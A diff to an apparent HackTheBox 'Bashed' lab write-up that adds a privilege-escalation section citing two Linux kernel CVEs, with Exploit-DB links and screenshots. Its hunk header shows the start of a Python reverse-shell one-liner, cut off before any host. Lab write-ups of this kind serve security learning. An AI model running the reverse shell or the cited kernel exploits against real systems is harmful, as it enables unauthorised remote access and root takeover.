@@ -32,3 +32,26 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 ![4.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bashed/4.jpg)
 
+![5.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bashed/5.jpg)
+
+## Privilege Escalation
+
+### With CVE: 2017-6074
+
+`Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free Privilege Escalation`
+
+***reference*** https://www.exploit-db.com/exploits/41458
+
+![6.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bashed/6.jpg)
+
+### With CVE: 2017-16995
+
+`
+Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation`
+
+
+***reference*** https://www.exploit-db.com/exploits/44298
+
+![7.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bashed/7.jpg)
+
+
